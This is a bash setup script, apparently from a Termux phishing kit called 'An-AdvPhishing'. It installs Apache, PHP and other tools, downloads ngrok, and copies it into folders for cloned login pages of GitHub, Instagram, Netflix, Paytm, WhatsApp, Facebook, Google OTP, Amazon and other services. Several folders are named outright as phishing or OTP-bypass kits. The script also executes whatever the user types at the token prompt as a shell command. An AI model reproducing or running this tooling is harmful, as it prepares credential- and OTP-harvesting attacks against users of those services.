#!/bin/bash
echo ""
clear
echo ""
echo ""
echo ""
echo ""
echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m!!! NGROK TOKEN MUST OTHERWISE SCRIPT NOT WORKING PROPERLY !!! \e[0m'
sleep 6
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
termux-setup-storage
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
pkg install wget -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
cp -R ngrok sites/github/
cp -R ngrok sites/Hotstar-otp-bypass/
cp -R ngrok sites/instagram/
cp -R ngrok sites/Linkedin/
cp -R ngrok sites/Netflix/
cp -R ngrok sites/Paytm-Phishing/paytm/
cp -R ngrok sites/Paytm-Phishing/signup/
cp -R ngrok sites/spotify/
cp -R ngrok sites/whatsapp-phishing/
cp -R ngrok sites/facebook/
cp -R ngrok sites/google-otp/
cp -R ngrok sites/instafollow/
cp -R ngrok sites/ipfinder/
cp -R ngrok sites/ola-otpbypass/
cp -R ngrok sites/UberEats-Phishing/
cp -R ngrok sites/Zomato-Phishing/
cp -R ngrok sites/amazonsign/
chmod 7777 An-AdvPhishing.sh
clear
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
sleep 2
clear
